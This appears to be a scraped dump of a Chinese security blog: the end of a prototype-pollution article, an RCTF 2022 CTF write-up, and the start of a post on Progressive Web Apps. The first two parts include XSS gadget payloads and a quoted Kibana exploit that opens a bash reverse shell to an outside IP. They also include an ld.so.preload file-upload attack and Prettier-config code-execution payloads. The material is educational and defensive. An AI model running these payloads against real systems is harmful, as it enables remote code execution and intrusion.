&#125; var config = &#123; a: 1, b: &#123; c: 2 &#125; &#125; var customConfig = &#123; b: &#123; d: 3 &#125; &#125; merge(config, customConfig) console.log(config) // &#123; a: 1, b: &#123; c: 2, d: 3 &#125; &#125; 如果上面的 customConfig 是可以控制的，那就會發生問題： var config = &#123; a: 1, b: &#123; c: 2 &#125; &#125; var customConfig = JSON.parse('&#123;\"__proto__\": &#123;\"a\": 1&#125;&#125;') merge(config, customConfig) var obj = &#123;&#125; console.log(obj.a) 這邊之所以用到 JSON.parse，是因為如果直接寫： var customConfig = &#123; __proto__: &#123; a: 1 &#125; &#125; 是沒有用的，customConfig 只會是一個空物件而已。要用 JSON.parse，才能製造出一個「key 是 __proto__」的物件： var obj1 = &#123; __proto__: &#123; a: 1 &#125; &#125; var obj2 = JSON.parse('&#123;\"__proto__\": &#123;\"a\": 1&#125;&#125;') console.log(obj1) // &#123;&#125; console.log(obj2) // &#123; __proto__: &#123; a: 1 &#125; &#125; 同樣地，也有許多 merge 相關的 library 曾經有這個漏洞，底下簡單列舉幾個： merge lodash.merge plain-object-merge 除了這些以外，只要是操作物件相關的 library 基本上都出現過類似問題，像是： immer mootools ioredis 現在已經知道哪些地方容易發生 prototype pollution 的問題了，但如果只是污染原型上的屬性，是沒有用的，還需要找到能影響到的地方，也就是說，有哪些地方在屬性被污染以後，行為會改變，可以讓我們執行攻擊？ Prototype pollution script gadgets這些「只要我們污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget，有一個 GitHub repo 專門搜集了這些 gadget：Client-Side Prototype Pollution，有些 gadget 可能是你想像不到的，我來示範一下（demo 網頁）： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"https://unpkg.com/vue/dist/vue.js\">&lt;/script> &lt;/head> &lt;body> &lt;div id=\"app\"> &#123;&#123; message &#125;&#125; &lt;/div> &lt;script> // 污染 template Object.prototype.template = '&lt;svg onload=alert(1)>&lt;/svg>'; var app = new Vue(&#123; el: '#app', data: &#123; message: 'Hello Vue!' &#125; &#125;); &lt;/script> &lt;/body> &lt;/html> 一段看起來沒什麼的 Vue hello world，在我們污染了 Object.prototype.template 之後，就變成了 XSS，可以讓我們插入任意程式碼。 或是像下面這樣（demo 網頁）： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js\">&lt;/script> &lt;/head> &lt;body> &lt;script> Object.prototype.innerText = '&lt;svg onload=alert(1)>&lt;/svg>'; document.write(sanitizeHtml('&lt;div>hello&lt;/div>')) &lt;/script> &lt;/body> &lt;/html> 明明是做 sanitize 的 library，在污染了 Object.prototype.innerText 之後，就變成了 XSS 的好幫手。 為什麼會有這些問題出現呢？以上面的 sanitize-html 為例，是因為有這一段程式碼： if (frame.innerText &amp;&amp; !hasText &amp;&amp; !options.textFilter) &#123; result += frame.innerText; &#125; 因為直接預設了 innerText 是安全的字串，所以就直接拼接上去，而我們污染了這個屬性，因此當這個屬性不存在時，就會用到 prototype 的值，最後變成了 XSS。 除了 client side 以外，server side 的 Node.js 也有類似的風險，例如說這樣： const child_process = require('child_process') const params = ['123'] const result = child_process.spawnSync( 'echo', params ); console.log(result.stdout.toString()) // 123 這是一段很單純的程式碼，執行 echo 指令然後傳入參數，這個參數會自動幫你做處理，所以不用擔心 command injection 的問題： const child_process = require('child_process') const params = ['123 &amp;&amp; ls'] const result = child_process.spawnSync( 'echo', params ); console.log(result.stdout.toString()) // 123 &amp;&amp; ls 但如果有一個 prototype pollution 的漏洞，就可以搖身一變成為 RCE（Remote code execution），讓攻擊者執行任意指令（假設攻擊者可以控制 params）： const child_process = require('child_process') const params = ['123 &amp;&amp; ls'] Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣 const result = child_process.spawnSync( 'echo', params, &#123;timeout: 1000&#125; ); console.log(result.stdout.toString()) /* 123 index.js node_modules package-lock.json package.json */ 之所以會這樣，是因為 child_process.spawn 的第三個參數 options 中有一個選項叫做 shell，設為 true 以後會造成行為不同，而官網的文件也有寫說： If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution. 透過 prototype pollution 搭配 script gadget（child_process.spawn），成功製造出一個嚴重性極高的漏洞。 中場總結如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。 例如說 Vue 的內部實作會根據某個物件的 template 這個屬性渲染出相對應的東西，於是我們只要污染 Object.prototype.template，就可以製造出一個 XSS 漏洞。或像是 child_process.spawn 用到了 shell，所以污染它以後就變成了 RCE 漏洞。 要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。 該如何防禦在 snyk 的任何一個 prototype pollution 漏洞頁面上都會有防禦建議，也可以參考這一篇：Prototype pollution attack in NodeJS application 常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 __proto__ 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。 但是除了 __proto__ 以外，也要注意另外一種繞過方式，像這樣： var obj = &#123;&#125; obj['constructor']['prototype']['a'] = 1 var obj2 = &#123;&#125; console.log(obj2.a) // 1 用 constructor.prototype 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。 像是 lodash.merge 的 prototype pollution 就是用這種方式修復的，當 key 是 __proto__ 或是 prototype 的時候會做特殊處理。 第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。 有些人可能看過一種建立物件的方式，是這樣的：Object.create(null)，這樣可以建立出一個沒有 __proto__ 屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題： var obj = Object.create(null) obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性 // TypeError: Cannot set property 'a' of undefined 像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 query-string，文件上面就寫了： .parse(string, options?)Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly. The returned object is created with Object.create(null) and thus does not have a prototype. 其他還有像是建議用 Map 來取代 &#123;&#125;，但我覺得目前大家還是習慣用 object 居多，我自己覺得 Object.create(null) 會比 Map 好用一點。 或是用 Object.freeze(Object.prototype)，把 prototype 凍結住，就沒辦法去修改： Object.freeze(Object.prototype) var obj = &#123;&#125; obj['__proto__']['a'] = 1 var obj2 = &#123;&#125; console.log(obj2.a) // undefined 但 Object.freeze(Object.prototype) 的問題之一是假設某個第三方套件有去修改 Object.prototype，比如說為了方便直接在上面加一個屬性，那就會比較難 debug，因為 freeze 之後去修改並不會造成錯誤，只是不會修改成功而已。 所以你可能會發現你的程式因為某個第三方套件壞掉了，但你不知道為什麼。還有一個我想到的可能風險是 polyfill，假設未來因為版本問題需要幫 Object.prototype 加上 polyfill，就會因為 freeze 的關係而失效。 至於 Node.js，還可以使用 --disable-proto 這個 option 來把 Object.prototype.__proto__ 關掉，詳情可以參考官方文件 或是未來也有可能使用 document policy 做處理，可以關注這個 issue： Feature proposal: Mitigation for Client-Side Prototype Pollution 實際案例最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。 第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：#986386 Reflected XSS on www.hackerone.com via Wistia embed code 在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣： i._initializers.initWLog = function() &#123; var e, t, n, o, a, l, s, d, u, p, c; if (t = i.url.parse(location.href), document.referrer &amp;&amp; (u = i.url.parse(document.referrer)), 它會去解析 location.href 跟 document.referrer，這兩者都是攻擊者可控的，然後 i.url.parse 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。 污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 createElement 有異曲同工之妙，fromObject 會去遍歷屬性然後放到 DOM 上： if (this.chrome = r.elem.fromObject(&#123; id: r.seqId('wistia_chrome_'), class: 'w-chrome', style: r.generate.relativeBlockCss(), tabindex: -1 &#125;) 所以只要污染 innerHTML，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。 這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦中有提過的技巧。 另一個案例是 Kibana 的漏洞，原始文章在這裡：Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)，官方對於這個漏洞的描述是這樣的： An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system. 在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype： .es.props(label.__proto__.x='ABC') 污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子： var env = options.env || process.env; var envPairs = []; for (var key in env) &#123; const value = env[key]; if (value !== undefined) &#123; envPairs.push(`$&#123;key&#125;=$&#123;value&#125;`); &#125; &#125; 這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 a=1 的話，應該就會跑 a=1 node xxx.js 這個指令。 既然是跑 node.js，我們可以利用 NODE_OPTIONS 這個環境變數來偷偷引入檔案： // a.js console.log('a.js') // b.js console.log('b.js') // 跑這個指令，用環境變數引入 a.js NODE_OPTIONS=\"--require ./a.js\" node b.js // 輸出 a.js b.js 所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？ 有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：透過 LFI 引入 PHP session 檔案觸發 RCE，而另一個 Linux 系統中的檔案 /proc/self/environ 則是會有現在的 process 的所有環境變數。 如果我們建立一個環境變數叫做 A=console.log(123)//，/proc/self/environ 的內容就會變為： A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8.... 就變成了合法的 JS 程式碼！ 於是就可以利用這樣的方式去執行它： NODE_OPTIONS=\"--require /proc/self/environ\" A='console.log(1)//' node b.js 作者最後給出的 code 長這樣： .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1\");process.exit()//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 /proc/self/environ 變成合法的 JS 並且包含了要執行的程式碼，另一個 NODE_OPTIONS 則透過 --require 去引入 /proc/self/environ，最後就串成了可以執行任意程式碼的 RCE 漏洞！ 結語我自己在接觸資安以前，是沒有聽過 prototype pollution 的。 因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。 有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。 我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。 最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild","link":"/2021/09/29/prototype-pollution/"},{"title":"RCTF 2022 筆記","text":"簡單記一些自己有打的題目，沒有打的就不記了。 依照慣例先附上關鍵字： Python os.path.join 的利用 YAML &amp; JS polyglot strace &amp; LD_PRELOAD filechecker 系列mini程式碼： from flask import Flask, request, render_template, render_template_string from waitress import serve import os import subprocess app_dir = os.path.split(os.path.realpath(__file__))[0] app = Flask(__name__) app.config['UPLOAD_FOLDER'] = f'&#123;app_dir&#125;/upload/' @app.route('/', methods=['GET','POST']) def index(): try: if request.method == 'GET': return render_template('index.html',result=\"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿\") elif request.method == 'POST': f = request.files['file-upload'] filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and \"..\" in filepath: return render_template('index.html', result=\"Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\") else: f.save(filepath) file_check_res = subprocess.check_output( [\"/bin/file\", \"-b\", filepath], shell=False, encoding='utf-8', timeout=1 ) os.remove(filepath) if \"empty\" in file_check_res or \"cannot open\" in file_check_res: file_check_res=\"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ\" return render_template_string(file_check_res) except: return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ') if __name__ == '__main__': serve(app, host=\"0.0.0.0\", port=3000, threads=1000, cleanup_interval=30) 簡單來說就是你上傳一個檔案，server 儲存以後會用 /bin/file 去檢查，並且把輸出丟給 render_template_string。也就是說我們只要能控制輸出就能輕鬆 SSTI。 當時我就直接跑去 file 的 Github 找測試，看有沒有可以用的，最後找到這個：https://github.com/file/file/blob/master/tests/escapevel.result 可以看到跑出來的結果包含一個 MIME type，這個 MIME type 存在於原始檔案中，所以修改一下就好了。 看到別人 writeup，發現其實這樣就好了，最簡單： #!&#x2F;testabc haha&#123;&#123;7+7&#125;&#125; 出來的結果會是： a &#x2F;testabc haha&#123;&#123;7+7&#125;&#125; script text executable, ASCII text, with no line terminators plus接著是加強版，程式碼跟剛剛差不多，唯一的差別只有結果不會丟到 render_template_string，所以無法 SSTI。 當初這題看了好一陣子，原本我猜這題會跟 file 怎麼運作有關，想說應該會跟他怎麼判斷類型（magic&#x2F;libmagic）有關，然後想辦法把 flag 檔案當作輸入外加自己寫的判斷，就可以慢慢去 leak file content 之類的。 結果隊友發現這一段有洞： filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and \"..\" in filepath: Python 的這個行為滿有趣的，那就是os.path.join 第二個參數如果是 / 開頭，他做的事情就不是 join 了： os.path.join(\"/tmp/a/\", \"b\") # /tmp/a/b os.path.join(\"/tmp/a/\", \"/b\") # /b 因此可以不需要有 .. 就把檔案上傳到任意地方，只要隨便寫個 C program 把 /bin/file 蓋掉就好了。 promax這題把剛剛的漏洞修了一半，變成只要檔案存在就不讓你上傳，所以不能蓋掉，只能上傳新東西。 此時我們還是往上一題之前想的方向去找，看怎麼運用現有機制，結果另一個隊友說他有個可能是非預期的解法，就解掉了。 原理是可以上傳檔案到 /etc/ld.so.preload，裡面內容放 /tmp/a.so 之類的，然後再上傳另一個檔案到 /tmp/a.so，此時 binary 在執行前就會先載入裡面的程式碼。 這邊記一下 DC 裡面 lavish 的詳細回答： os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], f.filename) allows for arbitrary file upload when f.filename is an absolute path. unlike filechecker_plus, you can’t now overwrite existing files such as /bin/file, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem if you strace an execution of /bin/file, you will notice that it tries to open (like any other executable) the /etc/ld.so.preload file. Have a look with strace file -b &lt;whatever&gt; |&amp; grep ENOENT -&gt; access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory) /etc/ld.so.preload is used to specify a list of shared libraries that are preloaded when any executable is run at this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a /etc/ld.so.preload containing the path to your .so and execute file again so that the flag is returned since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that file does a clean exit, otherwise subprocess.check_output will raise an exception 以前其實沒用過 strace，發現還滿好用的，簡單記錄一下用法： strace file -b &lt;whatever&gt; |&amp; grep ENOENT strace file /etc/passwd 2&gt;&amp;1 | grep &quot;No such file or directory&quot; 可以看到呼叫了哪些 system call &amp; 去動了哪些檔案 因為這個解法似乎跟 file 沒太大關係，導致我們一直認為是非預期，最後發現其實是預期解。 作者 writeup：https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022 PrettierOnline先說結論，我滿喜歡這題的 主要程式碼在這邊： const fs = require('fs') const crypto = require('crypto') const prettier = require('prettier') const &#123; nextTick, exit &#125; = require('process') require('./fw') const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim() fs.unlinkSync('./dist/id') prettier.resolveConfig(`$&#123;__dirname&#125;/.prettierrc`).then(config => &#123; const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config) const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex') fs.writeFileSync(`./dist/$&#123;id&#125;`, o, 'utf-8') fs.writeFileSync('./dist/ret.js', ret, 'utf-8') nextTick(() => &#123; throw new Error('No NextTick here!') &#125;) exit(0) &#125;) 簡單來說就是載入設定檔以後跑 prettier，這題你唯一能控制的就是這個設定檔。 然後 ./fw.js 裡面是去 patch require： const Module = require('module') const oldRequire = Module.prototype.require Module.prototype.require = function (id) &#123; if (typeof id !== 'string') &#123; throw new Error('Bye') &#125; const isCore = Module.isBuiltin(id) if (isCore) &#123; if (!/fs|path|util|os/.test(id)) &#123; throw new Error('Bye, ' + id) &#125; &#125; else &#123; id = Module._resolveFilename(id, this) &#125; return oldRequire.call(oldRequire, id) &#125; process.dlopen = () => &#123;&#125; 既然是有關 prettier config，第一步當然是先看官方文件：https://prettier.io/docs/en/configuration.html 當時有點看到幾個點： 支援 YAML 有一個 Sharing configurations 的東西，只放一個字串就會改成去 require 那個字串 第二點例如說你的 .prettierrc 長這樣： hello 跑 prettier 的時候就會出現：Error: Cannot find module &#39;hello&#39; 但因為 server 上也沒其他檔案可以控制，所以沒發現可以幹嘛，就繼續研究 prettier 到底做了什麼事情，花了一些時間開 debugger 去 trace，發現就算你丟的是 JSON，一樣是先走到 yaml.parse 去解析你的程式碼（沒什麼用的發現就是了） 後來東看西看，發現外加想起來有 plugin 這種東西，就寫了這樣的設定檔： &#123; &quot;plugins&quot;: [&quot;abc&quot;] &#125; 出現錯誤訊息 Error: Cannot find module &#39;abc&#39;，代表 prettier 會去 require plugin 沒有錯。 那我們要 require 什麼？此時我想到我們可以 require 唯一能控制的檔案：.prettierrc，也就是說如果 .prettierrc 同時是設定檔又是 JS 就行了。 幸好這在 yaml 裡面很容易： plugins: - \".prettierrc\" abc: - console.log(1) plgusin: 在 JS 裡面是標籤，- 是減號，所以完全沒問題。做到這裡我就覺得這題滿有趣的，把 JS+yaml polyglot 這概念再加上 real world 的 prettier 當作範例。 可以執行程式碼以後，就要看怎麼繞 require 的限制，我試過 import() 但沒作用，後來想了一下，既然都可以執行任意 JS，就隨便亂改一波就好了，像這樣： plugins: - \".prettierrc\" abc: - eval(\"h=RegExp.prototype.test;RegExp.prototype.test=function(v)&#123;return v == 'child_process' ? true : h.call(this,v)&#125;;f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c)&#123; if(a=='./dist/ret.js')&#123;b=f&#125;; return w.call(fs,a,b,c) &#125;\") 好讀版： h = RegExp.prototype.test; RegExp.prototype.test = function(v)&#123; return v == 'child_process' ? true : h.call(this,v) &#125;; f = require('child_process').execSync('/readflag').toString(); fs = require('fs'); w = fs.writeFileSync; fs.writeFileSync=function(a,b,c)&#123; if(a == './dist/ret.js')&#123; b = f &#125;; return w.call(fs,a,b,c) &#125; 先把 RegExp.test 改掉，就可以 require 任意東西，接著再讓 fs.writeFileSync 的時候內容會被換成 flag，最後就能拿到 flag 了。 作者 writeup：https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline 發現 require 根本不用繞，用 module.constructor._load(&#39;child_process&#39;) 其實就可以了，因為 require 裡面也是再去呼叫這個 _load 的方法：https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js // Loads a module at the given file path. Returns that module's // `exports` property. Module.prototype.require = function(id) &#123; validateString(id, 'id'); if (id === '') &#123; throw new ERR_INVALID_ARG_VALUE('id', id, 'must be a non-empty string'); &#125; requireDepth++; try &#123; return Module._load(id, this, /* isMain */ false); &#125; finally &#123; requireDepth--; &#125; &#125;; 最後還有一個 Nu1L 的 payload 也很炫： &#x2F;*&#x2F;..&#x2F;app&#x2F;.prettierrc #*&#x2F;const fs &#x3D; require(&#39;fs&#39;); var a &#x3D; fs.readFileSync(&quot;flag&quot;, &quot;utf-8&quot;);fs.writeFileSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,a);fs.chmodSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,0o444);process.addListener(&#39;uncaughtException&#39;, (err) &#x3D;&gt; &#123;console.log(&quot;ss&quot;,err);process.exit(0);&#125;) 這個利用了我開頭講的輸出一個字串就會 require，背後也是先用 yaml parse 所以 # 後面是註解，然後路徑的部分用了 /* 搭配第二行的 */ 結合變成合法 JS，tql！ 最後附上其他有找到的 writeup： RCTF 2022 WriteUp By F61d 2022RCTF WriteUp by Venom","link":"/2022/12/14/rctf-2022-writeup/"},{"title":"PWA 實戰經驗分享","text":"前言前些日子在忙公司的產品改版，從原本的 PHP 換成後端 Go + 前端 React SPA，分成桌面版跟手機版兩個不同的 Project，而既然都改版了，自然要把最新最潮的 PWA 也放在目標裡面，之前耳聞 PWA 很久但卻沒有實作過的我也有了機會來嘗試這個東西。 如今產品已經改版完畢且上線了兩三個月，慢慢穩定下來，在優化 PWA 的過程中也讓我有了一些心得可以讓大家分享。 在舉一些實際案例之前，先讓我們來談談到底怎樣才算是 PWA。 PWA 到底是什麼？從 Google 官方的文件：你的首個 Progressive Web App 中可以看出 PWA 的一些詳細定義，但我不太喜歡這種制式的規則，對我來說，PWA 就是一個很像 Native App 的 Web App，而其中瀏覽器的支援也佔了很大的一部分。 在以往儘管你的網站做得再怎麼像 Native App，你還是有兩個難關沒辦法克服：離線的時候就 GG 以及沒辦法安裝在手機上，所以不管怎麼看，人家都知道你就是個 Web App，永遠都不會長得像 Native。 可是自從瀏覽器開始支援 Service Worker 以及 manifest 之後，上面這兩點就被克服了！得益於 Service Worker，讓網頁離線的時候也能夠運作，可以自己寫 code 來決定要渲染什麼畫面；而瀏覽器的「新增到主畫面」的功能更是讓安裝 Web App 成為可能，開發者也可以用 manifest.json 來自訂一些內容，像是啟動畫面以及安裝在主畫面上的名稱等等。 對我來說，如果你能夠利用上面這兩項技術，讓你的 Web App 成功安裝在手機上並且看起來跟 Native App 沒兩樣，我覺得就能稱作是 PWA。 我在之前的文章（原來 CORS 沒有我想像中的簡單）已經有分享過 PWA 在手機上面的樣子了，這邊就不再贅述。還記得我第一次體驗安裝 PWA 的時候也被嚇到了，因為看起來就跟 Native App 沒兩樣，如果真的做得好，應該是很難區分出來的。明明是個網頁可是看起來卻跟 Native App 一樣，這就是 PWA。 接著來介紹幾個 PWA 的重要因素，你要做 PWA 就一定要有下面幾個東西。 manifest.json首先先來談manifest.json，有寫過 Android 的都知道有個東西叫做AndroidManifest.xml，其實兩個本質上是一樣的東西，就是去描述這個 App 的一些特性。 我們先來看看 Google 官方文件：The Web App Manifest裡面給的範例： &#123; \"short_name\": \"Maps\", \"name\": \"Google Maps\", \"icons\": [ &#123; \"src\": \"/images/icons-192.png\", \"type\": \"image/png\", \"sizes\": \"192x192\" &#125;, &#123; \"src\": \"/images/icons-512.png\", \"type\": \"image/png\", \"sizes\": \"512x512\" &#125; ], \"start_url\": \"/maps/?source=pwa\", \"background_color\": \"#3367D6\", \"display\": \"standalone\", \"scope\": \"/maps/\", \"theme_color\": \"#3367D6\" &#125; 裡面給的資訊很簡單，然後會跟你把 PWA 新增到主畫面時出現的東西息息相關。name的話就是你 App 的名稱，他在主畫面上面就會顯示這個name，但如果你也有提供short_name的話會優先使用short_name。 再來icons就是主畫面上面會出現的 logo 囉，這沒什麼好多談的。start_url則是你從主畫面上開啟時會連線到的地方，很多人會加個?source=pwa之類的，這樣就可以知道這個使用者是使用 PWA，方便做一些統計。 這邊有個小地方要注意，那就是在某一版的 iOS Safari（抱歉我忘記是哪一版，但總之最新的已經沒有這個問題了），它是不會遵守start_url的！他會根據的是你在安裝 PWA 時的網址，例如說你在https://example.com/test/123的時候按下「新增到主畫面」，你在主畫面開啟 PWA 時就會連線到這個畫面。 這部分其實滿困擾的，但幸好最新的 iOS Safari 已經沒有這個問題了，大家可以不用擔心。 還有一個要特別提的就是name、background_color跟icon會自動組成Splash screens，就是你在打開 PWA 的時候會看到的一個畫面，是由這三個資訊自動被 Chrome 所組成的，意思就是你沒辦法客製化這個啟動畫面。 它就是會顯示你指定的背景顏色、然後中間放一個 icon 下面放你 App 的名稱，沒有其他東西可以調了，至少現在是這樣。 在這點上面 iOS 就不一樣，iOS 是不支援這種啟動畫面的，但好處就是你可以自己透過 html 的 tag 來設定！ &lt;link rel='apple-touch-startup-image' href='/assets/splash/splash-1125x2436.png' media='(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)' /> 會有一些尺寸相關的設定你因為要幫每一種不同的 device 都準備一張圖片，詳情可參考：Progressive Web App Splash Screens 或是 Few Tips That Will Make Your PWA on iOS Feel Like Native。 iOS 跟 Android 的差別在於 iOS 的啟動畫面你可以放一張圖片，因此可以完全客製化，你想放什麼就放什麼，自由度比 Android 來得高。 還有就是 icon 的部分，iOS 也不會看你mainfest.json的設定，而是會看自己的 html tag，所以你必須額外設置給 iOS 使用的 icon： &lt;link rel='apple-touch-icon' sizes='192x192' href='/assets/favicons/iOS192x192.png' /> 對於manifest.json，該注意的點差不多就這些。其實最大的問題還是支援度，所以 Google 出了一個PWACompat，可以自動幫你針對舊的瀏覽器調整你的檔案以及 html 的 tag，不過也有人寫了一篇：You shouldn’t use Chrome’s PWACompat library in your Progressive Web Apps 來告訴大家不要用，論點大概是不能這樣一概論之，你必須針對每種不同的平台跟瀏覽器去了解他的差異再來做適配，才能得到最好的使用者體驗，這種統一調整的做法會在很多地方看起來 ok 但是怪怪的。 既然上面都提到 iOS 了，就來講講 iOS 的一些不同之處。其實 iOS 開始提供 PWA 的支援是今年（2018 年）的事情而已，而且剛推出的時候支援度滿差的，不過有在慢慢改善就是了。 關於那些 iOS 不同的地方，這兩篇文章都講得很清楚了：PWAs are coming to iOS 11.3: Cupertino, we have a problem、Progressive Web Apps on iOS are here 🚀。 最大的差異之一大概就是很多時候都不看manifest.json，你要自己額外設置一些相對應的 html tag 才有用，這點是要特別注意的。 再來就是&lt;meta name=”apple-mobile-web-app-capable” content=”yes”&gt;這個 tag 也很重要，主要是告訴瀏覽器説：「我準備好提供全螢幕的體驗了，就算隱藏瀏覽器的 UI 也沒關係」，而這篇：Don’t use iOS meta tags irresponsibly in your Progressive Web Apps 則告訴你千萬不要濫用這個 tag，不然你的 Web App 在 Safari 上的體驗會變得很差，因為很多東西都不支援。 至於 Safari 最大的一點問題我直接引用上面 PWAs are coming to iOS 11.3: Cupertino, we have a problem 的其中一段： Also, it’s a massive problem for apps with two-factor authentication, such as Twitter. If you need to go to another app to get a token or to open a text message or an email, you will get out of the PWA. When you go back to paste the code, you are out of context and, you need to start the login process again losing the validity of that code. It happened to me on Twitter! Which means, the Twitter PWA on iOS is completely unusable for me. 這是什麼意思呢？我直接舉一個實際範例，假如你的 PWA 有提供 Facebook 登入的功能而且是用重新導向的方式，你一點下去他就會開一個新的 Safari 視窗連到 Facebook 讓你授權，可是當你授權完之後回到 PWA，你會發現什麼事情都沒發生。 這一點真的超傷，而且現在應該都還沒修好，只能期待 Safari 之後會把問題修掉了。而 Android Chrome 則是會在同一個視窗底下打開 Facebook，因此結束之後能夠順利完成登入流程。 有關於 iOS 的問題跟manifest.json的注意事項差不多就到這邊，再來我們談談 PWA 的第二個重點：Service Worker。 Service Worker加入 Service Worker 的目的就只有一個，那就是快取。透過 Service Worker（以下簡稱 SW），可以幫助我們在發送 request 之前就先攔截到並且做處理，而離線運行的原理也是這樣的，我們先在第一次開啟時註冊 SW，並且利用 SW 下載靜態檔案並快取住，之後若使用者離線，我們再用已經快取住的檔案來回覆，就不會發送真的 request，自然也不會發生無法連線的情況。 而 Google 有提供了一個方便的工具：Workbox 來幫助我們自動產生出 SW 以及利用更方便的語法來攔截 request。 舉例來說，我自己用的是 Webpack 的 plugin： new workboxPlugin.InjectManifest(&#123; swSrc: path.join(__dirname, '..', SRC_DIR, 'sw.js'), swDest: path.join(__dirname, '..', DIST_DIR, 'sw.js'), globDirectory: path.join(__dirname, '..', DIST_DIR), globPatterns: ['**/*.&#123;js,css&#125;'] &#125;), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) 只要這樣一寫，就會自動去找符合規則的檔案並且加入快取清單裡面，你只要一註冊 SW 的時候就會把那些檔案給快取起來。 除此之外呢，Workbox 也可以針對 URL 來監聽： // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args => workbox.strategies .networkFirst(&#123; cacheName: 'data-cache', plugins: [ new workbox.expiration.Plugin(&#123; maxEntries: 100, maxAgeSeconds: 2592000 &#125;) ] &#125;) .handle(args) .then(response => &#123; return response &#125;) 